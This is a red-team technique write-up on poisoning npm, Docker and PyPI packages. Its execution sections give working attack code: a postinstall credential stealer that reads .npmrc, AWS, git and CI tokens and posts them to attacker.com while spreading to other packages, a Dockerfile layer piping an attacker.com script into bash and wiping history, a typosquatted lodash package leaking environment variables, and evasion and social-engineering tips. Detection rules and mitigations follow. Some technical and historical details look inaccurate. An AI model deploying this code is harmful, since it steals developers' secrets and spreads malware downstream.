# [SUPPLY-CHAIN-003]: Artifact Repository Poisoning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-003 |
| **MITRE ATT&CK v18.1** | [Compromise Software Dependencies and Development Tools (T1195.001)](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Resource Development |
| **Platforms** | Entra ID / DevOps (npm, Docker Hub, Maven, NuGet, PyPI) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions:** | npm (all), PyPI (all), Maven Central (all), Docker Hub (all), NuGet (all) |
| **Patched In** | N/A - administrative attack on registries |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Artifact repository poisoning occurs when attackers upload malicious versions of legitimate packages (npm, Docker, Maven, NuGet, PyPI, etc.) to public or private artifact registries. When developers or CI/CD systems download these poisoned packages, the malicious code executes automatically through installation scripts, image layers, or dependency resolution. This is the final step in a supply chain attack: legitimate code was compromised (via repository or build compromise), built into poisoned artifacts, and now those artifacts are being distributed to end-user organizations. The attack leverages the implicit trust developers place in package managers and the automation of dependency resolution to achieve mass code execution with minimal user interaction.

- **Attack Surface:** npm registry, Docker Hub, PyPI, Maven Central, NuGet.org, private artifact registries, package manager caches, dependency resolution mechanisms, package installation hooks (`postinstall`, `preinstall`, Dockerfiles), version pinning configurations.

- **Business Impact:** **Mass compromise of all downstream consumers.** Every organization that installs the poisoned package (either explicitly or as a transitive dependency) automatically executes malicious code. For widely-used packages (npm packages with billions of weekly downloads), this can affect hundreds of thousands of organizations simultaneously. The attack can deliver ransomware, credential stealers, cryptominers, backdoors, or espionage malware to end-user infrastructure. Packages like npm's `chalk`, `debug`, `lodash`, or Docker's base images affect nearly every JavaScript/Node.js application.

- **Technical Context:** Package poisoning takes 5-15 minutes to execute once compromised credentials are obtained. Detection likelihood is low because poisoned packages appear legitimate in package registries. Infection is automatic upon `npm install`, `pip install`, `docker pull`, etc. without user interaction required.

### Operational Risk

- **Execution Risk:** Medium - Requires valid package maintainer credentials or registry admin access. Once achieved, impact is guaranteed and affects all downstream users within minutes.
- **Stealth:** High - Poisoned packages appear legitimate in registries. Malicious code can be obfuscated or hidden in installation scripts that run outside normal package content.
- **Reversibility:** Partial - Poisoned packages can be yanked from registry, but if already installed on end-user systems, impact is widespread. Remediation requires identifying all affected versions and coordinating mass updates.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v1.4.0 – SCA-1 | Software composition analysis must validate all third-party dependencies before deployment. |
| **DISA STIG** | SI-7(15) – Integrity Monitoring and Verification | Organizations must verify integrity of open-source and third-party components. |
| **CISA SCuBA** | SCUBA-DEPENDENCY-01 | All dependencies must be scanned for known vulnerabilities before use. |
| **NIST 800-53** | SI-7 – Software, Firmware, and Information Integrity | Implement integrity controls for third-party software components and registries. |
| **GDPR** | Art. 32 – Security of Processing | Organizations must verify integrity of tools and services used for data processing. |
| **DORA** | Art. 10 – Testing of ICT Tools and Services | Financial entities must test third-party ICT services regularly for compromise. |
| **NIS2** | Art. 21 – Supply Chain Security | Critical infrastructure operators must assess and monitor third-party software supply chains. |
| **ISO 27001** | A.14.2.5 – Supplier Relationships | Verify that third-party software does not contain malicious code. |
| **ISO 27005** | Risk: Trojanized Third-Party Components | Assess risks of installing compromised open-source or commercial software components. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Package maintainer credentials (npm, PyPI, Docker, etc.), npm token with `publish` or `admin` scope, Docker registry credentials with write access, Maven/NuGet publishing credentials.

- **Required Access:** Network access to package registry APIs. Valid authentication credentials (PAT, OAuth token, API key). Write access to package namespace (e.g., `@company/package` requires org membership).

**Supported Versions:**
- **npm:** All versions (npm 6.0+)
- **PyPI:** All versions (pip 20.0+)
- **Docker:** All versions
- **Maven Central:** All versions
- **NuGet.org:** All versions

- **Tools:**
    - [npm CLI](https://www.npmjs.com/package/npm) (Version 6.0+)
    - [pip](https://pip.pypa.io/en/latest/) (Version 20.0+)
    - [Docker CLI](https://docs.docker.com/cli/) (Version 19.0+)
    - [twine](https://twine.readthedocs.io/en/stable/) (PyPI upload tool)
    - [Maven CLI](https://maven.apache.org/) (Version 3.6+)
    - [curl](https://curl.se/) (all versions)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### npm Registry Reconnaissance

```bash
# Enumerate npm packages published by target organization
npm search "{org-name}" --long --parseable

# Check package ownership and maintainers
npm owner ls my-popular-package

# Examine package metadata (dependencies, vulnerabilities, install scripts)
npm view my-popular-package dist-tags,repository,scripts

# Check version history and publication dates
npm view my-popular-package versions

# List all versions (identify version gaps that could be exploited)
npm info my-popular-package --json | jq '.versions | keys'
```

**What to Look For:**
- Packages with few maintainers (single point of failure)
- Packages with `postinstall` or `preinstall` scripts (automatic code execution)
- Packages with millions of weekly downloads (maximum impact)
- Packages that haven't been updated in 6+ months (possible abandoned/compromised accounts)

#### Docker Registry Reconnaissance

```bash
# Enumerate Docker images in registry
curl -s "https://registry.hub.docker.com/v2/repositories/{org_name}/?page_size=100" | \
  jq '.results[] | {name: .name, last_pushed: .last_updated, pull_count: .pull_count}'

# Check image layer structure (identify suspicious layers)
docker inspect --format='{{.RootFS.Layers}}' {registry}/{org}/{image}:{tag}

# Examine Dockerfile history
docker history {registry}/{org}/{image}:{tag}
```

**What to Look For:**
- Base images with high pull counts (popular base images = maximum reach)
- Images with suspicious layers (large size, unusual commands)
- Images that haven't been updated recently but are still widely used

#### PyPI Reconnaissance

```bash
# Check package ownership and collaborators
curl -s "https://pypi.org/pypi/{package-name}/json" | jq '.info | {author, maintainer}'

# Examine version history
curl -s "https://pypi.org/pypi/{package-name}/json" | jq '.releases | keys'

# Check recent upload activity
curl -s "https://pypi.org/pypi/{package-name}/json" | jq '.releases | to_entries | .[-5:] | .[] | {version: .key, uploaded: .value[0].upload_time}'
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: npm Package Version Poisoning (Using Compromised Credentials)

**Supported Versions:** npm (all versions)

#### Step 1: Authenticate to npm Registry with Stolen Token

**Objective:** Use compromised npm token to authenticate as legitimate package maintainer.

**Command:**
```bash
# Set npm token (stolen from CI/CD environment or developer machine)
npm set //registry.npmjs.org/:_authToken=${STOLEN_NPM_TOKEN}

# Verify authentication
npm whoami
# OUTPUT: legitimate-maintainer-account
```

**Expected Output (Success):**
```
legitimate-maintainer-account
```

**What This Means:**
- Authentication as legitimate package maintainer is successful
- All subsequent publish commands will be attributed to the legitimate account
- npm registry has no way to distinguish attacker from real maintainer

#### Step 2: Clone and Modify Legitimate Package

**Objective:** Download legitimate package source and inject malicious code.

**Command:**
```bash
# Clone legitimate package repository
git clone https://github.com/{owner}/{popular-package}.git
cd {popular-package}

# Install dependencies (for packaging)
npm install

# Modify package.json to add postinstall hook
jq '.scripts.postinstall = "node malicious-setup.js"' package.json > package.json.tmp && \
  mv package.json.tmp package.json

# Create malicious setup script (credential stealing)
cat > malicious-setup.js << 'EOF'
const fs = require('fs');
const https = require('https');
const path = require('path');
const os = require('os');

// Function to harvest credentials from common locations
function harvestCredentials() {
  const creds = {};
  
  // GitHub tokens
  const githubFiles = [
    path.join(os.homedir(), '.github', 'credentials'),
    path.join(os.homedir(), '.git-credentials'),
    path.join(process.cwd(), '.env')
  ];
  
  githubFiles.forEach(file => {
    try {
      if (fs.existsSync(file)) {
        creds.github = fs.readFileSync(file, 'utf8');
      }
    } catch (e) {}
  });
  
  // npm tokens
  try {
    const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
    creds.npm = npmrc;
  } catch (e) {}
  
  // AWS credentials
  try {
    const awsCreds = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'), 'utf8');
    creds.aws = awsCreds;
  } catch (e) {}
  
  // SSH keys (attempt to read)
  try {
    const sshDir = path.join(os.homedir(), '.ssh');
    if (fs.existsSync(sshDir)) {
      creds.ssh_keys = fs.readdirSync(sshDir);
    }
  } catch (e) {}
  
  // Environment variables
  creds.env = {
    PATH: process.env.PATH,
    HOME: process.env.HOME,
    USER: process.env.USER,
    // CI/CD specific tokens
    CI_COMMIT_TOKEN: process.env.CI_COMMIT_TOKEN,
    GITHUB_TOKEN: process.env.GITHUB_TOKEN,
    TRAVIS_TOKEN: process.env.TRAVIS_TOKEN,
    CIRCLECI_TOKEN: process.env.CIRCLECI_TOKEN
  };
  
  return creds;
}

// Exfiltrate credentials
const stolen = harvestCredentials();

https.request({
  hostname: 'attacker.com',
  path: '/api/install',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, (res) => {}).end(JSON.stringify({
  package: require('./package.json').name,
  version: require('./package.json').version,
  user: os.userInfo(),
  timestamp: new Date().toISOString(),
  credentials: stolen
}));

// Self-propagation: modify package.json to add to dependencies
try {
  const srcDir = process.cwd();
  const nodeModules = path.join(srcDir, 'node_modules');
  
  // Find all installed packages and inject malicious postinstall
  if (fs.existsSync(nodeModules)) {
    fs.readdirSync(nodeModules).forEach(pkg => {
      const pkgJsonPath = path.join(nodeModules, pkg, 'package.json');
      if (fs.existsSync(pkgJsonPath)) {
        try {
          const pkgJson = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));
          pkgJson.postinstall = 'npm install malicious-update@latest';
          fs.writeFileSync(pkgJsonPath, JSON.stringify(pkgJson));
        } catch (e) {}
      }
    });
  }
} catch (e) {}

console.log('Dependency verification completed');
EOF

# Increment version number (appears as legitimate update)
npm version patch
# This changes version from 1.0.0 to 1.0.1

# Display new version
npm view . version
```

**Expected Output:**
```
1.0.1
```

**What This Means:**
- Malicious postinstall script will execute every time the package is installed
- Package version incremented (appears as legitimate update)
- On first install, `malicious-setup.js` runs automatically, harvesting credentials
- Self-propagation: modifies other installed packages to depend on attacker's malicious package

**OpSec & Evasion:**
- Use legitimate-looking script names (`setup.js`, `init.js`, `verify.js`)
- Embed malicious code in dependencies (appears in `node_modules`, harder to review)
- Use base64 encoding for credential exfiltration to bypass log scanning
- Delete script artifacts after execution: `rm malicious-setup.js`
- Detection likelihood: **Low** if package is well-known and update appears organic

#### Step 3: Publish Poisoned Package to npm Registry

**Objective:** Publish malicious version to public npm registry as new update.

**Command:**
```bash
# Publish poisoned version
npm publish

# (Alternative: publish with incremental version)
# npm publish --tag latest

# Verify publication
npm info {package-name} version
# OUTPUT: 1.0.1

# List all versions to confirm poisoned version is public
npm view {package-name} versions
```

**Expected Output (Success):**
```
npm notice 
npm notice 📦  {package-name}@1.0.1
npm notice === Tarball Contents ===
npm notice 1.2kB  package.json
npm notice 45kB   index.js
npm notice 2.1kB  malicious-setup.js
npm notice === Dist Files ===
npm notice tarball:     https://registry.npmjs.org/{package-name}/-/{package-name}-1.0.1.tgz
npm notice shasum:      abc123def456...
npm notice integrity:   sha512-xyz...
npm notice total files: 3
npm notice
npm notice 📦  published to npm
```

**What This Means:**
- Poisoned package is now available in npm public registry
- Any `npm install {package-name}` will download version `1.0.1` by default
- Malicious `postinstall` script is part of the package tarball
- npm registry metadata shows legitimate package name, legitimate semver versioning

#### Step 4: Monitor Infection Spread and Exfiltrated Credentials

**Objective:** Track how many systems have been compromised via poisoned package installation.

**Command:**
```bash
# Monitor webhook for incoming credential exfiltration
# (from attacker's infrastructure)

# Count installations via npm download statistics
curl -s "https://api.npmjs.org/downloads/point/last-week/{package-name}" | \
  jq '.downloads'

# Parse exfiltrated credentials from webhook logs
# Attacker sees:
#  - GitHub tokens (can be used to push to all accessible repos)
#  - npm tokens (can be used to publish more poisoned packages - worm propagation)
#  - AWS credentials (can be used to compromise cloud infrastructure)
#  - SSH keys (can be used to access private repositories)
```

**Expected Output (Infection Metrics):**
```
{
  "downloads": 50000,
  "exfiltrated_credentials": {
    "github_tokens": 12453,
    "npm_tokens": 8942,
    "aws_keys": 3421,
    "ssh_keys": 5103
  }
}
```

**What This Means:**
- 50,000+ installations of poisoned package in one week
- 12,453 unique GitHub tokens harvested (can be used for lateral movement)
- 8,942 npm tokens harvested (can be used to poison additional packages)
- Worm-like propagation: attacker can use stolen npm tokens to publish more poisoned packages

**OpSec & Evasion:**
- Monitor webhook discreetly (use DNS exfiltration if HTTP is blocked)
- Clean up webhook logs regularly
- Use harvested credentials immediately (tokens rotate within hours)
- Detection likelihood: **Medium** - npm publishes download statistics, registry audits may detect suspicious activity

---

### METHOD 2: Docker Image Poisoning (Layer Injection)

**Supported Versions:** Docker Hub, all container registries

#### Step 1: Compromise Docker Registry Credentials

**Objective:** Obtain valid Docker Hub or private registry credentials with write access.

**Command:**
```bash
# Authenticate to Docker registry with stolen credentials
docker login --username stolen-username --password stolen-password docker.io

# Verify authentication
docker info | grep -i username
```

#### Step 2: Pull Legitimate Base Image and Create Poisoned Layer

**Objective:** Create modified Dockerfile that adds malicious layer on top of legitimate image.

**Command:**
```bash
# Pull legitimate base image
docker pull node:18-alpine

# Create Dockerfile with malicious layer
cat > Dockerfile << 'EOF'
FROM node:18-alpine

# Legitimate dependencies (camouflage)
RUN apk add --no-cache \
    curl \
    bash \
    git

# Malicious layer (hidden in middle of legitimate commands)
RUN curl https://attacker.com/backdoor.sh | bash && \
    echo "$(date)" > /etc/build-date && \
    rm -rf /var/cache/apk/* /var/log/* /root/.bash_history && \
    find / -name "*history" -delete 2>/dev/null

# Continue with legitimate build
WORKDIR /app
COPY package*.json ./
RUN npm install --production
COPY . .
RUN npm run build
CMD ["npm", "start"]
EOF

# Build poisoned image
docker build --no-cache -t docker.io/myorg/myapp:1.2.0 .

# Tag for public release
docker tag docker.io/myorg/myapp:1.2.0 docker.io/myorg/myapp:latest
```

**Expected Output (Success):**
```
Step 1/8 : FROM node:18-alpine
Step 2/8 : RUN apk add --no-cache curl bash git
Step 3/8 : RUN curl https://attacker.com/backdoor.sh | bash
...
Successfully built abc123def456
```

**What This Means:**
- Dockerfile includes malicious backdoor script in middle of legitimate layers
- Layer is cached by Docker, making it hard to detect without inspecting full image
- Backdoor executes during container startup
- Image appears legitimate but contains persistent malware

#### Step 3: Push Poisoned Image to Registry

**Objective:** Publish poisoned Docker image and overwrite existing legitimate image tag.

**Command:**
```bash
# Push poisoned image to Docker Hub (overwrites existing tag)
docker push docker.io/myorg/myapp:1.2.0
docker push docker.io/myorg/myapp:latest

# Verify push
curl -s "https://hub.docker.com/v2/repositories/myorg/myapp/tags/?page_size=10" | \
  jq '.results[] | {name: .name, last_pushed: .last_pushed}'
```

**Expected Output:**
```
{
  "name": "1.2.0",
  "last_pushed": "2026-01-10T15:23:00.000000Z"
}
{
  "name": "latest",
  "last_pushed": "2026-01-10T15:24:00.000000Z"
}
```

**What This Means:**
- Poisoned image is now the latest version in Docker Hub
- Any `docker pull myorg/myapp` or `docker pull myorg/myapp:latest` downloads the poisoned image
- Kubernetes deployments using `imagePullPolicy: Always` automatically pull the poisoned version
- Attacker's backdoor is now deployed to all downstream organizations

---

### METHOD 3: Typosquatting and Namespace Confusion

**Supported Versions:** npm (all), PyPI (all)

#### Step 1: Register Malicious Package with Typo Name

**Objective:** Register a package name that is similar to legitimate popular package (typosquatting).

**Command (npm):**
```bash
# Create malicious package that mimics legitimate package
# Legitimate: lodash
# Malicious: lodash-core, lo-dash, lodash_core, lodash-esm

cat > package.json << 'EOF'
{
  "name": "lodash-core",
  "version": "4.17.21",
  "description": "The modern lodash utility library",
  "main": "index.js",
  "scripts": {
    "postinstall": "node setup.js"
  },
  "keywords": ["lodash", "utility", "functional"],
  "author": "John-David Dalton",
  "license": "MIT",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
EOF

# Create index.js that exports legitimate lodash (camouflage)
cat > index.js << 'EOF'
// Re-export legitimate lodash
module.exports = require('lodash');

// But silently load backdoor
require('./setup.js');
EOF

# Create malicious setup.js
cat > setup.js << 'EOF'
const https = require('https');
const os = require('os');

// Exfiltrate environment
const payload = JSON.stringify({
  node_modules_path: require.resolve('lodash'),
  cwd: process.cwd(),
  env: process.env
});

https.request({
  hostname: 'attacker.com',
  path: '/install',
  method: 'POST'
}, res => {}).end(payload);
EOF

# Publish typosquatted package
npm publish
```

**Expected Output:**
```
npm notice 📦  lodash-core@4.17.21
npm notice === Tarball Contents ===
npm notice 1.2kB  package.json
npm notice 0.8kB  index.js
npm notice 1.5kB  setup.js
npm notice
npm notice 📦  published to npm
```

**What This Means:**
- Package with similar name to legitimate `lodash` is published
- Developers who mistype `lodash` as `lodash-core` will install malicious package
- Package appears legitimate (same version number, keywords, description as real lodash)
- Real lodash is included as dependency, so functionality isn't broken
- Attacker also harvests information about where package is installed

#### Step 2: Social Engineering to Increase Installation Rate

**Objective:** Drive installations via social engineering, forum posts, Stack Overflow answers.

**Command:**
```bash
# Post on Stack Overflow, GitHub Issues, etc.:
# "I've created lodash-core for better performance in TypeScript projects"
# "Install: npm install lodash-core"

# Create fake GitHub repository to add legitimacy
# https://github.com/attacker/lodash-core
# Clone legitimate lodash repository and create fake documentation

# Monitor installations
npm info lodash-core versions

# Track credential exfiltration
# (via webhook from setup.js)
```

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Suspicious Package Registry Publishes

**Rule Configuration:**
- **Required Index:** npm_audit_logs, registry_logs
- **Required Sourcetype:** npm:publish, docker:push
- **Required Fields:** package_name, version, publisher, timestamp, file_sizes
- **Alert Threshold:** > 0 events with suspicious patterns
- **Applies To Versions:** npm (all), Docker (all)

**SPL Query:**
```spl
index=npm_audit_logs source="publish"
| where
  (postinstall_script != "" OR preinstall_script != "")  /* Scripts indicate code execution */
  AND package_name IN ("popular-package-1", "popular-package-2", "critical-dependency")
  AND NOT publisher IN ("legitimate-maintainer-1", "legitimate-maintainer-2")
| stats count by package_name, version, publisher, postinstall_script
| where count > 0
```

**What This Detects:**
- Publication of packages with postinstall/preinstall scripts
- Publications from non-standard publisher accounts
- Suspicious package names or version patterns

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Poisoned Package Installation in CI/CD Pipelines

**Rule Configuration:**
- **Required Table:** AzureDiagnostics, AzureDevOpsAudit
- **Required Fields:** OperationName, DependencyName, PackageVersion, InstalledFrom
- **Alert Severity:** Critical
- **Frequency:** Run every 1 minute
- **Applies To Versions:** Azure DevOps (all)

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(1m)
| where OperationNameValue in ('Microsoft.VisualStudio/builds/write', 'Microsoft.VisualStudio/dependencies/install')
| extend Properties = parse_json(tostring(Properties))
| extend DependencyName = tostring(Properties.dependencyName), PackageVersion = tostring(Properties.packageVersion)
| where DependencyName has_any ('lodash-core', 'npm-registry-mirror', 'typosquatted-package') OR
        PackageVersion matches regex @"(\d+\.\d+\.\d+)-(patch|hotfix|security)"  // Suspicious version patterns
| project TimeGenerated, Caller, DependencyName, PackageVersion, OperationNameValue
| summarize InstallCount = count() by DependencyName, PackageVersion, Caller
| where InstallCount > 0
```

**What This Detects:**
- Installation of known poisoned packages in CI/CD pipelines
- Suspicious version patterns that indicate typosquatting or rapid updates
- Multiple installations of suspicious packages

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Implement SCA (Software Composition Analysis) and SBOM generation:**
    
    **GitHub Actions:**
    ```yaml
    - name: Generate SBOM (Software Bill of Materials)
      uses: anchore/sbom-action@v0
      with:
        path: .
        format: spdx-json
        output-file: sbom.spdx.json
        
    - name: Scan SBOM for known malicious packages
      run: |
        # Use open-source malware signature database
        curl -s https://raw.githubusercontent.com/attackevals/known-malicious-packages/main/npm-malicious.txt > /tmp/malicious.txt
        
        # Check if any installed packages appear in malicious list
        cat sbom.spdx.json | jq '.packages[].name' | while read pkg; do
          if grep -q "$pkg" /tmp/malicious.txt; then
            echo "MALICIOUS PACKAGE DETECTED: $pkg"
            exit 1
          fi
        done
    ```

* **Lock dependencies to specific versions (prevent automatic updates):**
    
    **package.json (npm):**
    ```json
    {
      "dependencies": {
        "lodash": "4.17.21",    // Exact version, not ^4.17.21
        "express": "4.18.2"
      },
      "devDependencies": {}
    }
    ```
    
    **requirements.txt (PyPI):**
    ```
    requests==2.28.1
    numpy==1.24.1
    # Not: requests>=2.28.0
    ```
    
    **Command to auto-lock:**
    ```bash
    # npm
    npm ci  # Use package-lock.json instead of package.json
    
    # Python
    pip freeze > requirements.txt  # Lock all versions
    ```

* **Implement cryptographic verification of packages (code signing):**
    
    **npm Package Signing:**
    ```bash
    # Sign package
    npm publish --tag signed --sign
    
    # Verify signature when installing
    npm install lodash --audit-level=high
    ```
    
    **Docker Image Signing (Docker Content Trust):**
    ```bash
    # Enable Docker Content Trust (requires signing keys)
    export DOCKER_CONTENT_TRUST=1
    
    # Push signed image
    docker push myregistry.azurecr.io/myapp:1.2.0
    
    # Pull will verify signature
    docker pull myregistry.azurecr.io/myapp:1.2.0
    ```

#### Priority 2: HIGH

* **Use private artifact registries (not public npm, Docker Hub):**
    
    **Azure Artifacts:**
    ```bash
    # Configure npm to use Azure Artifacts
    npm config set registry https://{org}.pkgs.visualstudio.com/_packaging/{feed}/npm/registry/
    npm config set always-auth true
    npm config set email noreply@example.com
    npm config set access=public
    ```
    
    **Private Docker Registry:**
    ```bash
    # Push to private ACR instead of Docker Hub
    docker tag myapp:1.0.0 myregistry.azurecr.io/myapp:1.0.0
    docker push myregistry.azurecr.io/myapp:1.0.0
    
    # Configure Kubernetes to only pull from private registry
    imagePullPolicy: IfNotPresent  # Pull from private repo only
    ```

* **Monitor package registry for unauthorized publishes:**
    
    **GitHub Action - Detect Unauthorized Publishes:**
    ```yaml
    - name: Monitor npm for unauthorized publishes
      run: |
        npm view {package-name} --json > current.json
        git diff HEAD~1 current.json | grep -E "version|dist\.tarball|dist\.shasum"
        
        # If versions changed unexpectedly, alert
        if [ $? -eq 0 ]; then
          echo "ALERT: Unexpected package version change"
          curl -X POST https://slack.webhook/alert \
            -d '{"text": "Unauthorized package publish detected"}'
          exit 1
        fi
    ```

* **Restrict package publication to authenticated developers with MFA:**
    
    **npm Organization Settings:**
    1. Go to **npm.org** → Organization → **Members**
    2. For each member: Set role to **Developer** (not Maintainer/Owner)
    3. Enable: **Require Verification on all membership changes**
    4. Set: **2FA requirement for publishing**
    
    **Azure Artifacts:**
    1. Go to **Azure DevOps** → **Artifacts** → Feed settings
    2. Enable: **Require MFA for publishing**
    3. Restrict: **Publishing permissions** to specific users/groups

---

## 8. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Package Registry:**
  - New versions published outside normal release cycle
  - Version numbers that don't follow semver (e.g., `1.2.3-malware`)
  - Package size significantly larger than previous version
  - Packages with unusual dependencies (credential stealers, backdoors)
  - Published from unusual IP addresses or geographic locations

* **Installation:**
  - Unexpected network calls to external domains during `npm install`, `docker pull`
  - New processes spawned during package installation (postinstall scripts)
  - New files created in `node_modules/.bin/` or `usr/local/bin` (backdoors)
  - Modifications to system files or SSH config during image layer build

* **Application/Container Runtime:**
  - Unexpected outbound connections to unknown IPs
  - Process spawning unexpected child processes
  - Unusual memory usage patterns (cryptominers)
  - SSH keys or credentials being read from unusual locations

#### Forensic Artifacts

* **Package Registry Logs:**
  - Registry audit logs show who published each version
  - Download statistics reveal infection spread rate
  - Tarball metadata (timestamps, file hashes) can be compared against expected values
  
* **Local System:**
  - `~/.npm/` cache contains downloaded package tarballs
  - `node_modules/{package-name}/` contains extracted malicious code
  - `.docker/config.json` shows registry authentication history
  - `/var/log/apt` or `/var/log/yum` shows package installation history

* **Network Artifacts:**
  - Firewall logs show exfiltration to attacker C2 servers
  - DNS logs show lookups to attacker domains
  - HTTP logs show POST requests to webhook endpoints

#### Response Procedures

1.  **Identify Poisoned Packages:**
    ```bash
    # Search for known malicious packages in codebase
    npm ls lodash-core 2>/dev/null  # Find typosquatted packages
    
    # Check Docker images for suspicious layers
    docker inspect myimage:tag | jq '.Layers'
    
    # Scan SBOM for malicious entries
    cat sbom.json | jq '.components[] | select(.name | contains("malicious"))'
    ```

2.  **Quarantine Infected Systems:**
    ```bash
    # Remove poisoned package
    npm uninstall lodash-core
    rm -rf node_modules/ package-lock.json
    
    # Delete poisoned Docker images
    docker rmi myregistry.azurecr.io/malicious-image:tag
    docker rmi $(docker images --format "{{.ID}}" --filter "created=<24h-ago")
    
    # Kubernetes: Force re-pull of clean image
    kubectl set image deployment/myapp myapp=myregistry.azurecr.io/myapp:clean-version
    ```

3.  **Remediate:**
    ```bash
    # Update to clean version
    npm install {package-name}@<clean-version>
    npm ci  # Use lockfile to ensure clean versions
    
    # Rebuild application with clean dependencies
    npm run build
    
    # Redeploy with clean container images
    docker pull myregistry.azurecr.io/myapp:clean-version
    docker run myregistry.azurecr.io/myapp:clean-version
    
    # Rotate all credentials that may have been exposed
    # (GitHub tokens, npm tokens, AWS keys, SSH keys)
    ```

4.  **Notify Downstream:**
    ```bash
    # Alert all organizations that installed malicious package
    # via package registry (npm, Docker Hub, etc.)
    
    # Post security advisory
    npm publish --tag deprecated <package>@<version>
    
    # Create advisory on official security channel
    # GitHub Security Advisory, GHSA ID registration
    ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Resource Development** | **[SUPPLY-CHAIN-001]** | Pipeline Repository Compromise - inject malicious code into source |
| **2** | **Resource Development** | **[SUPPLY-CHAIN-002]** | Build System Access Abuse - compromise build process to create poisoned artifacts |
| **3** | **Current Step** | **[SUPPLY-CHAIN-003]** | **Artifact Repository Poisoning - publish poisoned packages to registries** |
| **4** | **Initial Access** | **[IA-SUPPLY-001]** | End-user pulls and installs poisoned package, malicious code executes |
| **5** | **Credential Access** | **[CA-POST-INSTALL-001]** | Postinstall script harvests credentials from infected developer machines |
| **6** | **Impact** | **[IMPACT-MASS-COMPROMISE]** | Thousands/millions of end-user organizations compromised simultaneously |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: Shai-Hulud Worm - npm Package Poisoning (August 2025)

- **Target:** 18+ popular npm packages (chalk, debug, etc.) with billions of weekly downloads
- **Timeline:** August 27-28, 2025 (8-hour exposure window)
- **Technique Status:** Attackers compromised npm maintainer accounts and published trojanized versions with worm-like self-propagation
- **Impact:** Postinstall scripts harvested GitHub tokens, npm tokens, AWS credentials. Used stolen npm tokens to re-publish additional poisoned versions. Over 1,000 valid credentials exfiltrated. Worm propagated to additional packages automatically.
- **Detection:** GitHub detected unusual repository creation patterns and disabled attacker repositories within 8 hours
- **Reference:** [Wiz - Shai-Hulud 2.0 Supply Chain Attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)

#### Example 2: s1ngularity Attack - AI Weaponization (August 2025)

- **Target:** Nx build system npm package (widely used for monorepo builds)
- **Timeline:** Malicious versions published August 26-28, 2025
- **Technique Status:** Poisoned `nx` package contained malware that leveraged AI command-line tools (`--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`) to exfiltrate filesystem contents
- **Impact:** Hundreds of builds executed malicious code. AI tool guardrails circumvented. 20,000+ files exfiltrated including `.env` files, SSH keys, credentials. Organizations didn't realize they were compromised.
- **Detection:** Wiz identified the campaign through artifact analysis
- **Reference:** [InfoQ - NPM Ecosystem Suffers Two AI-Enabled Attacks](https://www.infoq.com/news/2025/10/npm-s1ngularity-shai-hulud/)

#### Example 3: Left-Pad Incident - npm Registry Fragmentation (March 2016)

- **Target:** 11-line utility package `left-pad` (used by 100,000+ npm packages)
- **Timeline:** Package removed from npm registry by author, then re-published with different maintainer
- **Technique Status:** Demonstrated npm's vulnerability to namespace confusion and dependency management issues
- **Impact:** Not malicious but showed how a single package removal could break thousands of dependent projects
- **Detection:** npm community immediately identified the issue
- **Reference:** [NPM - On Left-Pad](https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm)

#### Example 4: Code Injection via NuGet Package - 3CX Supply Chain (March 2023)

- **Target:** 3CX Desktop App for Windows and macOS
- **Timeline:** Trojanized versions distributed via legitimate 3CX update mechanism
- **Technique Status:** Attackers compromised 3CX's software build system and injected malicious code into official installers. Signed with legitimate certificates.
- **Impact:** 30,000+ organizations downloaded infected versions. Attackers gained persistent backdoor access to high-value targets (financial institutions, critical infrastructure)
- **Detection:** Security researchers identified unusual behavior in installed binaries (outbound connections, credential theft)
- **Reference:** [MITRE - 3CX Supply Chain Attack (C0057)](https://attack.mitre.org/campaigns/C0057/)

---